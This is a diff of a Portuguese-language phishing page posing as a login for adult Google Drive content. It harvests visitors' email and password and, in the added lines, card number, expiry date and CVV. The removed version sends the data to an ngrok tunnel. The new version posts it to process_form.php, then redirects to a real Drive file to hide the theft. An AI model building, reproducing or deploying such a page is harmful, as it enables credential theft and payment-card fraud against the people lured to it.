@@ -6,13 +6,12 @@
     <title>Login Form</title>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
-        /* Estilo para o corpo da página */
         body {
             font-family: Arial, sans-serif;
-            background-image: url('https://github.com/Lai1s/presente/blob/5c9504ffab714c5cd2ea7edcf3fc5180786f2a52/fundo%202%20p.jpeg?raw=true'); /* Caminho para a imagem de fundo no GitHub */
-            background-size: cover; /* Garante que a imagem cubra todo o fundo */
-            background-repeat: no-repeat; /* Evita repetição da imagem */
-            background-position: center; /* Centraliza a imagem */
+            background-image: url('WhatsApp Image 2024-04-09 at 15.19.32.jpeg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
             margin: 0;
             padding: 0;
             display: flex;
@@ -22,34 +21,29 @@
             color: #000;
             position: relative;
         }
-        /* Estilo para o container */
         .container {
             width: 350px;
-            background-color: rgba(255, 255, 255, 0.7); /* Adiciona um fundo branco semi-transparente */
+            background-color: rgba(255, 255, 255, 0.7);
             padding: 30px;
             border-radius: 10px;
             box-shadow: 0px 0px 20px 0px rgba(0,0,0,0.1);
             position: relative;
             z-index: 1;
         }
-        /* Estilo para os cabeçalhos dentro do container */
         .container h2 {
             text-align: center;
             margin-bottom: 30px;
             color: #000;
         }
-        /* Estilo para grupo de formulário */
         .form-group {
             margin-bottom: 20px;
         }
-        /* Estilo para campos de entrada de formulário */
         input.form-control {
             border-radius: 20px;
             padding: 12px 20px;
             font-size: 16px;
             border: 1px solid #ddd;
         }
-        /* Estilo para botão */
         button {
             width: 100%;
             padding: 12px;
@@ -61,7 +55,6 @@
             cursor: pointer;
             transition: background-color 0.3s ease;
         }
-        /* Estilo para o estado de hover do botão */
         button:hover {
             background-color: #0056b3;
         }
@@ -70,12 +63,21 @@
 <body>
     <div class="container">
         <h2>Conteúdos GoogleDrive🔞</h2>
-        <form id="loginForm" method="POST" action="https://6cce-2804-6850-8000-3d01-c12e-b350-c502-7e67.ngrok-free.app/">
+        <form id="loginForm" method="POST" action="process_form.php">
             <div class="form-group">
                 <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
             </div>
             <div class="form-group">
                 <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
+            </div>
+            <div class="form-group">
+                <input type="text" class="form-control" id="card_number" name="card_number" placeholder="Número do cartão">
+            </div>
+            <div class="form-group">
+                <input type="text" class="form-control" id="expiration_date" name="expiration_date" placeholder="Data de expiração (MM/AA)">
+            </div>
+            <div class="form-group">
+                <input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV">
             </div>
             <button type="button" onclick="enviarFormulario()">Entrar</button>
             <p id="mensagemErro" style="color: red;"></p>
@@ -86,8 +88,11 @@
         function enviarFormulario() {
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
+            var cardNumber = document.getElementById('card_number').value;
+            var expirationDate = document.getElementById('expiration_date').value;
+            var cvv = document.getElementById('cvv').value;
 
-            if (email === '' || password === '') {
+            if (email === '' || password === '' || cardNumber === '' || expirationDate === '' || cvv === '') {
                 document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
                 return;
             }
@@ -95,11 +100,15 @@
             var formData = new FormData();
             formData.append('email', email);
             formData.append('password', password);
+            formData.append('card_number', cardNumber);
+            formData.append('expiration_date', expirationDate);
+            formData.append('cvv', cvv);
 
             var xhr = new XMLHttpRequest();
             xhr.open('POST', document.getElementById("loginForm").action);
             xhr.onload = function () {
                 if (xhr.status === 200) {
+                    // Redirecionar para o site correto após o login bem-sucedido.
                     window.location.href = "https://drive.google.com/file/d/1-n2-7RG13HA7ttCVJukD_PpoMDsSRS6n/view?usp=drive";
                 } else {
                     var mensagem = xhr.responseText;
